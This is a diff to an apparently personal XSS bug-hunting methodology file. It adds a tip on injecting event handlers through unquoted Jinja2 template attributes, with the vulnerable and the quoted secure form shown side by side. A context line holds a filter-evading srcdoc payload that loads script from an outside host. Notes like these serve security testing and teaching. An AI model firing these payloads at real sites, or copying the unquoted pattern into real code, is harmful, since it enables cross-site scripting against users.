@@ -5,7 +5,11 @@ link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
 ````
 ![Screenshot from 2023-06-16 18-53-58](https://github.com/Sameer484/methodology/assets/110039044/58c56999-42da-4fcb-a447-b11f9e223984)
 
-
+#### If you found jinja2 templating engine being used , then see if the double quote is placed when using templating syntax in attribute. If directly {{name}} is being used then we can use "x eventhandler=alert(1)" to execute xss. Using space we can escape the attribute.
+````
+<input type={{name}}>         ==> vulnerable code
+<input type="{{name}}" >      ==> well secure code
+````
 ---
 #### Quick tips
 - See the reflected value and open inspect element. Search(ctrl+f) for the entered keywords and trace where is it being used.
